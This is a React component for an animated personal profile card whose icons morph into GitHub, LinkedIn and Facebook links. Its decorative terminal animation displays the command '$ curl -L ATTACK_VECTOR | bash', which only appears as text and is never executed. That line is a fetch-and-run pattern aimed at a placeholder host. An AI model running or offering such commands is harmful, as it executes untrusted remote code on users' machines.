import React from 'react'
import Panel from 'muicss/lib/react/panel'
import MorphIcon from './MorphIcon'

let Zap = (
  <svg 
    viewBox='0 0 40 40'
    key='zap'
    fill='darkseagreen'
  >
    <path d='m32.5 17.5h-10l7.5-17.5-22.5 22.5h10l-7.5 17.5 22.5-22.5z'/>
  </svg>
)

let Cog = (
  <svg 
    viewBox='0 0 40 40'
    key='cog'
    fill='darkseagreen'
  >
    <path d='m25.9 20q0-2.4-1.7-4t-4.1-1.7-4 1.7-1.7 4 1.7 4 4 1.7 4.1-1.7 1.7-4z m11.4-2.4v4.9q0 0.3-0.2 0.5t-0.4 0.3l-4.2 0.6q-0.4 1.3-0.8 2.1 0.7 1.1 2.3 3.1 0.3 0.2 0.3 0.5t-0.2 0.5q-0.6 0.9-2.2 2.4t-2.1 1.6q-0.3 0-0.6-0.2l-3.1-2.4q-1 0.5-2 0.9-0.4 3-0.7 4.1-0.1 0.6-0.8 0.6h-4.9q-0.3 0-0.6-0.1t-0.2-0.5l-0.7-4.1q-1.1-0.4-2-0.9l-3.1 2.4q-0.2 0.2-0.6 0.2-0.3 0-0.5-0.2-2.8-2.6-3.7-3.8-0.2-0.2-0.2-0.5 0-0.2 0.2-0.5 0.3-0.5 1.1-1.5t1.2-1.5q-0.6-1.2-0.9-2.3l-4.1-0.6q-0.2 0-0.4-0.2t-0.2-0.6v-4.9q0-0.3 0.2-0.5t0.4-0.3l4.2-0.7q0.3-1 0.8-2-0.9-1.3-2.4-3.1-0.2-0.3-0.2-0.5 0-0.2 0.2-0.5 0.6-0.8 2.2-2.4t2.1-1.6q0.3 0 0.6 0.2l3.1 2.4q1-0.5 2-0.9 0.4-3 0.7-4.1 0.1-0.6 0.8-0.6h4.9q0.3 0 0.6 0.1t0.2 0.5l0.7 4.1q1 0.4 2 0.9l3.1-2.4q0.2-0.2 0.6-0.2 0.3 0 0.5 0.2 2.9 2.6 3.7 3.8 0.2 0.2 0.2 0.5 0 0.2-0.2 0.5-0.4 0.5-1.2 1.5t-1.2 1.5q0.6 1.2 1 2.2l4 0.7q0.3 0 0.5 0.2t0.2 0.6z'/>
  </svg>
)

let GH = (
  <svg
    viewBox='0 0 40 40'
    key='gh'
    fill='darkseagreen'
  >
    <path d='m20 0c-11 0-20 9-20 20 0 8.8 5.7 16.3 13.7 19 1 0.2 1.3-0.5 1.3-1 0-0.5 0-2 0-3.7-5.5 1.2-6.7-2.4-6.7-2.4-0.9-2.3-2.2-2.9-2.2-2.9-1.9-1.2 0.1-1.2 0.1-1.2 2 0.1 3.1 2.1 3.1 2.1 1.7 3 4.6 2.1 5.8 1.6 0.2-1.3 0.7-2.2 1.3-2.7-4.5-0.5-9.2-2.2-9.2-9.8 0-2.2 0.8-4 2.1-5.4-0.2-0.5-0.9-2.6 0.2-5.3 0 0 1.7-0.5 5.5 2 1.6-0.4 3.3-0.6 5-0.6 1.7 0 3.4 0.2 5 0.7 3.8-2.6 5.5-2.1 5.5-2.1 1.1 2.8 0.4 4.8 0.2 5.3 1.3 1.4 2.1 3.2 2.1 5.4 0 7.6-4.7 9.3-9.2 9.8 0.7 0.6 1.4 1.9 1.4 3.7 0 2.7 0 4.9 0 5.5 0 0.6 0.3 1.2 1.3 1 8-2.7 13.7-10.2 13.7-19 0-11-9-20-20-20z'/>
  </svg>
)

let LI = (
  <svg
    viewBox='0 0 40 40'
    key='li'
    fill='darkseagreen'
  >
    <path d='m32.6 5c1.4 0 2.4 1 2.4 2.3v25.1c0 1.4-1 2.6-2.4 2.6h-25c-1.4 0-2.6-1.2-2.6-2.6v-25.1c0-1.3 1.2-2.3 2.6-2.3h25z m-18.3 25v-13.4h-4.3v13.4h4.3z m-2-15.4c1.4 0 2.3-1 2.3-2.3 0-1.3-0.8-2.3-2.3-2.3s-2.3 1-2.3 2.3c0 1.3 0.9 2.3 2.3 2.3z m17.7 15.4v-7.8c0-4-2.1-5.9-4.9-5.9-2.3 0-3.3 1.4-3.9 2.2v-1.9h-4.3v13.4h4.3v-7.6c0-0.4 0-0.8 0.1-1.1 0.3-0.8 1-1.5 2.2-1.5 1.6 0 2.2 1.1 2.2 2.9v7.3h4.3z'/>
  </svg>
)

let FB = (
  <svg
    viewBox='0 0 40 40'
    key='fb'
    fill='darkseagreen'
  >
    <path d='m30.9 2.9q2.6 0 4.5 1.8t1.9 4.6v21.4q0 2.7-1.9 4.6t-4.5 1.8h-4.2v-13.2h4.4l0.7-5.2h-5.1v-3.3q0-1.3 0.5-1.9t2-0.6l2.8 0v-4.7q-1.5-0.2-4-0.2-3.1 0-4.9 1.8t-1.8 5.1v3.8h-4.5v5.2h4.5v13.2h-11.9q-2.6 0-4.5-1.8t-1.9-4.6v-21.4q0-2.7 1.9-4.6t4.5-1.8h21.5z'/>
  </svg>
)

export default props => (
  <Panel
    style={{
      maxWidth: '300px',
      margin: '10px auto',
      borderRadius: '0',
      backgroundColor: 'black',
    }}
  >
    <div
      style={{
        position: 'relative',
        width: '100%',
        height: 0,
        padding: 0,
        paddingBottom: (843 / 1024 * 100) + '%',
        overflow: 'hidden',
        backgroundColor: 'black',
        borderRadius: '5px',
        border: 'solid 1px antiquewhite',
      }}
    >
      <div
        style={{
          padding: '5px',
          display: 'inline-block',
          width: 'auto',
        }}
      >
        <div
          className='mui--text-body2'
          style={{
            overflow: 'hidden',
            display: 'inline-block',
            fontSize: '0.75em',
            lineHeight: '1',
            paddingRight: '0.15em',
            borderRight: '1em solid rgba(200,200,200,0.5)',
            whiteSpace: 'nowrap',
            letterSpacing: '0.15em',
            animation: 'typing 2.25s steps(30), cursorOut 0s step-end 2.75s forwards',
          }}
        >
          <div
            className='mui--text-body2'
            style={{
              display: 'inline-block',
              color: 'darkseagreen',
              fontSize: '1em',
              lineHeight: '1.75',
              fontFamily: 'monospace',
            }}
          >
            $ curl -L ATTACK_VECTOR | bash
          </div>
        </div>
        <br/>
        <div
          className='mui--text-body2'
          style={{
            overflow: 'hidden',
            display: 'inline-block',
            fontSize: '0.75em',
            lineHeight: '1',
            paddingRight: '0.15em',
            whiteSpace: 'nowrap',
            letterSpacing: '0.15em',
            animation: 'cursorIn 0s step-end 3.1s forwards',
          }}
        >
          <div
            className='mui--text-body2'
            style={{
              display: 'inline-block',
              color: 'darkseagreen',
              fontSize: '1em',
              lineHeight: '1.75',
              fontFamily: 'monospace',
            }}
          >
            &nbsp;
          </div>
        </div>
      </div>
      <div
        style={{
          position: 'absolute',
          left: '25px',
          bottom: '1000px',
          marginBottom: '5px',
          animation: 'bolt 1.5s linear 2s forwards',
        }}
      >
        <a target='_blank' href='https://github.com/thurber'>
          <MorphIcon
            delay={3400}
            duration={300}
            iconFrom={Zap}
            iconTo={GH}
          />
        </a>
      </div>
      <div
        style={{
          position: 'absolute',
          left: '85px',
          bottom: '1000px',
          marginBottom: '5px',
          animation: 'bolt 1.5s linear 2.4s forwards',
        }}
      >
        <a target='_blank' href='https://www.linkedin.com/in/travisthurber'>
          <MorphIcon
            delay={3800}
            duration={300}
            rotation='counterclock'
            iconFrom={Zap}
            iconTo={LI}
          />
        </a>
      </div>
      <div
        style={{
          position: 'absolute',
          left: '145px',
          bottom: '1000px',
          marginBottom: '5px',
          animation: 'bolt 1.5s linear 2.2s forwards',
        }}
      >
        <a target='_blank' href='https://www.facebook.com/tbthurber'>
          <MorphIcon
            delay={3600}
            duration={300}
            iconFrom={Zap}
            iconTo={FB}
          />
        </a>
      </div>
      <div
        style={{
          position: 'absolute',
          left: '205px',
          bottom: '1000px',
          marginBottom: '5px',
          padding: 0,
          animation: 'bolt 1.5s linear 2.6s forwards',
        }}
      >
        <MorphIcon
          delay={4000}
          duration={300}
          rotation='counterclock'
          iconFrom={Zap}
          iconTo={Cog}
          style={{
            animation: 'gear 10s linear 4s infinite',
          }}
        />
      </div>
    </div>
  </Panel>
)
